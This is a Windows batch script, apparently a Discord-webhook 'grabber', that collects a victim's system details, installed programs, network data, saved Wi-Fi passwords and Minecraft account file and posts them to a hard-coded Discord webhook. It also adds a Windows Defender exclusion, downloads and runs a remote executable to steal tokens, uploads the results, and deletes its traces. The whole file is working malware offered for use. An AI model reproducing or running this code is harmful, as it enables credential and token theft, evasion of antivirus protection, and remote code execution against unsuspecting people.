@echo off
set currentdir=%~dp0
cd %currentdir%

set webhook=https://discord.com/api/webhooks/1020814175112536084/eKoM05Czt2y2Eq4KhKw-XuE3Q2oNbCljIP2ZRfUCOA8pQ8yFhxaRMgIsblywiuiDxHOd

::Baum made this part so go give him love. I am using it cause 1.) its not bad at all and 2.) I am lazy. In conclusion go check out his github https://github.com/baum1810

:check_Permissions
    

    net session >nul 2>&1
    if %errorLevel% == 0 (
        goto starti
    ) else (
       cls
       echo Failure: Please run the file again with Admin
       timeout 2 >NUL
       goto check_Permissions
    )

:starti
::set 1 if you want that the discord of your target get closed ( discord needs to be restarted to send you the token)
set /a killdc = 0

::get ip
curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt

::gets a list of all installed programms
powershell -Command "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table >%userprofile%\AppData\Local\Temp\programms.txt "


::gets informations about the pc
echo Hard Drive Space:>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber>>%userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU:>>%userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name>>%userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo>%userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid >%userprofile%\AppData\Local\Temp\uuid.txt
for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
    netsh wlan show profile %%a key=clear >>%userprofile%\AppData\Local\Temp\wlan.txt
   
)

:aftertesti

::gets the ipconfig (also local ip)
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt

::gets the info about the netstat
netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt

::sends the launcher_accounts.json if minecraft exist
if exist %userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json %web% && goto end

::sends the username, ip, current time, and date of the victim


curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%

::sends all files
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\System_INFO.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\sysi.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\ip.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\netstat.txt %webhook% 
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\programms.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\uuid.txt %webhook%
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\wlan.txt %webhook%

::back to my code!

cd %userprofile%\AppData\Local\Temp
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
curl -O https://cdn.discordapp.com/attachments/1020784906864963644/1020788311670931496/main.exe
timeout 3 >NUL
start main.exe
timeout 3 >NUL

taskkill /f /im main.exe
curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\tokens.txt %webhook%

del %userprofile%\AppData\Local\Temp\tokens.txt
del %localappdata%\Temp\ip.txt
del %localappdata%\Temp\ipp.txt
del %localappdata%\Temp\sysi.txt
del %localappdata%\Temp\System_INFO.txt
del %localappdata%\Temp\netstat.txt
del %localappdata%\Temp\programms.txt
del %localappdata%\Temp\uuid.txt
del %localappdata%\Temp\main.exe
pause